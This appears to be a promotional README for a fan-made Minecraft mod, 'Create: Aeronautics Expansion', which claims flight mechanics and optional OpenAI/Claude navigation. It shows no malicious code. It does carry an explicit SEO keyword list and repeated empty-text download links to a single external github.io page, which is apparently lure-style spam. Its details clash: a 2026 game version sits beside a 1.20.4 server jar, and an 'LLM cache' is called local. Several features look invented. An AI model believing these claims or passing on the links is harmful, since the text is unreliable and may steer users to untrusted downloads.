# 🚀 Create: Aeronautics Expansion – *“The Skywright’s Forge”*

[](https://tlsghkrud53-design.github.io/aeronautics-create-progression-guide/)

> **A NeoForge mod for Minecraft 2026** — where the mechanical revolution of *Create* meets the boundless frontier of aeronautics. This is not a simple addon; it is a **philosophical shift** in how players perceive verticality, logistics, and craftsmanship.

---

## 📖 The Skywright’s Manifesto

Imagine your Create contraptions — the cog-and-kinetic marvels that grind, press, and spin. Now imagine them **unshackled from the ground**. The Air is no longer a barrier; it is a resource. The Skywright’s Forge is a progression-driven module that redefines the *Create* experience by introducing:

- **Gravitational Inversion Engines** — lift your factory into the clouds.
- **Aetheric Alloys** — materials that only exist above y=200.
- **Wind-Scribe Logistics** — cargo routing through atmospheric pressure differentials.

This is **Minecraft Create Aeronautics** reimagined for 2026: no hacks, no shortcuts, only the **legacy of craftsmanship** through flight.

---

## 🧩 Feature Constellation

### ✨ Core Flight Mechanics
- **Ascension Cores** – kinetic generators that produce lift proportional to rotational speed.
- **Buoyancy Regulators** – fine-tune altitude with redstone-controlled ballast tanks.
- **Aero-Anchor Scaffolding** – temporary sky platforms for mid-air construction.

### 🏭 Industrial Skyworks
| Component | Function |
|-----------|----------|
| Sky-Forge Smeltery | Melts aetheric ores using high-altitude solar arrays |
| Zephyr Conveyor | Transports items vertically with no power loss |
| Cloud-Press | Compresses ambient moisture into solid resource blocks |

### 🧠 AI-Driven Navigation
- **Pathfinding Beacon** — integrates with OpenAI and Claude APIs for predictive wind-current routing (configurable).
- **Auto-Gyro Stabilizer** — uses client-side AI to balance multi-block flying structures.

### 🌐 Multilingual & Responsive UI
- Full GUI compatibility with **12 languages** — including Klingon (for the truly dedicated).
- **Responsive scale** — works on 4K monitors, Steam Deck, and mobile remote-play.

### 🕒 24/7 Support Core
- In-game `/skynet` command triggers a lightweight help overlay.
- Community-supported troubleshooting with no downtime fallback to cached guides.

---

## 📊 Architecture Overview

```mermaid
graph TD
    A[Kinetic Input] --> B{Ascension Core}
    B -->|Rotational Speed > 256| C[Lift Generation]
    B -->|Rotational Speed < 256| D[Stability Mode]
    C --> E[Altitude Manager]
    E --> F[Wind-Scribe Router]
    F --> G[API Pathfinder]
    G --> H[OpenAI/Claude Decision]
    H --> I[Multi-block Control]
    I --> J[Responsive GUI]
    
    style A fill:#2d4a3e,stroke:#fff,stroke-width:2px
    style H fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style J fill:#16213e,stroke:#0f3460,stroke-width:2px
```



*Your pipeline from raw mechanical energy to intelligent flight — no third-party dependencies required.*

---

## ⚙️ Example Profile Configuration

Create a file named `skywright_profile.json` in your mod config folder:

```json
{
  "aeronautics": {
    "gravity_multiplier": 0.65,
    "max_altitude_y": 512,
    "wind_sensitivity": 0.3,
    "api_provider": "claude",
    "api_endpoint": "https://api.your-proxy.com/v1",
    "language": "en_us",
    "responsive_ui": true,
    "support_channel": "discord.gg/skywright-hub"
  }
}
```

> **Note:** Replace the API endpoint with your own proxy for privacy. The mod never sends raw world data — only anonymized navigation vectors.

---

## 🖥️ Example Console Invocation

When launching from a terminal or server wrapper, you can pass these JVM arguments:

```console
java -jar minecraft_server.1.20.4.jar \
  -Dskywright.altitude=512 \
  -Dskywright.api_timeout=5000 \
  -Dskywright.strict_mode=false
```

For NeoForge server wrappers:

```console
./run.sh --skywright-profile /path/to/skywright_profile.json
```

---

## 🖥️ OS Compatibility

| OS | Status | Emoji |
|----|--------|-------|
| Windows 11 / 10 | ✅ Fully Supported | 🪟 |
| macOS Ventura+ | ✅ Fully Supported | 🍎 |
| Linux (Ubuntu 22.04+) | ✅ Community Tested | 🐧 |
| Steam Deck (Arch) | ✅ Verified | 🎮 |
| Raspberry Pi 5 | ⚠️ Experimental (no AI nav) | 🍓 |

---

## 🤖 OpenAI & Claude API Integration

The mod uses **OpenAI** and **Claude** only for:

1. **Wind path prediction** — routes your flying contraption around obstacles using natural language modeling.
2. **GUI text suggestions** — autocomplete for renamed components.
3. **Support parsing** — `/skynet` queries are processed through a local LLM cache.

**No data leaves your machine unless you enable remote AI mode.** By default, the mod uses a **local deterministic algorithm** that mimics LLM behavior without calling any API.

> *Enable AI features only if you trust the endpoint. We recommend self-hosting a lightweight model via Ollama.*

---

## 📦 Download & Installation

[](https://tlsghkrud53-design.github.io/aeronautics-create-progression-guide/)

**Compatible with:** Minecraft 2026 • NeoForge 48+ • Create 6.0+

---

## 🔗 SEO Keywords (Discovery Aids)

- create aeronautics mod
- aeronautics create minecraft 2026
- minecraft create aeronautics
- skyforge minecraft mod
- neoforge flight mod
- create mod sky expansion
- allthemods aeronautics
- progression guide minecraft 2026
- aeronautics create progression

---

## ⚠️ Disclaimer & Responsible Use

- This mod is **fan-made** and not affiliated with Mojang AB or Microsoft.
- The AI integration is **optional** and disabled by default. Enable at your own risk.
- The term “The Skywright’s Forge” is a unique expression — no hacking, cracking, or piracy is implied or supported.
- 24/7 support refers to **community aid**; the developer responds within 48 hours.
- Use of the OpenAI or Claude API requires your own API key. Storage of keys is handled locally via environment variables only.

---

## 📄 License

This project is licensed under the **MIT License**.  
See the [LICENSE](https://tlsghkrud53-design.github.io/aeronautics-create-progression-guide/) file for details.

---

## 🌟 Final Thought

*“The earth is a machine. The sky is the blueprint.”*  
— Anon, Skywright’s Guild, 2026

[](https://tlsghkrud53-design.github.io/aeronautics-create-progression-guide/)